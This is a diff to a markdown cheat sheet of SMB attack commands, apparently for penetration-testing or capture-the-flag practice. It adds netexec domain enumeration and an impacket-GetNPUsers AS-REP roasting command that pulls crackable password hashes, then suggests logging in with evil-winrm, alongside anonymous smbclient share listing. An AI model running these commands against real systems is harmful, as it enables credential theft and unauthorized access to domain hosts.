@@ -1,5 +1,15 @@
 # SMB examples
 
+
+## SMB gathering information
+
+- `netexec` 
+`netexec smb $IP` - get domain information
+- `crackmapexec`
+
+`impacket-GetNPUsers domain.local/ -dc-ip $IP -request -usersfile /tmp/userlist.txt` - TGT check users if they have there send you hash with user. Then crack the hash and connect server over smb or rdp or WinRM `evil-winrm` (if open)
+
+---
 `smbclient -L 10.10.10.10 -N` - list with anonymous (-N)
 
 `smbclient \\\\10.10.10.10\\{anything}` - open directory
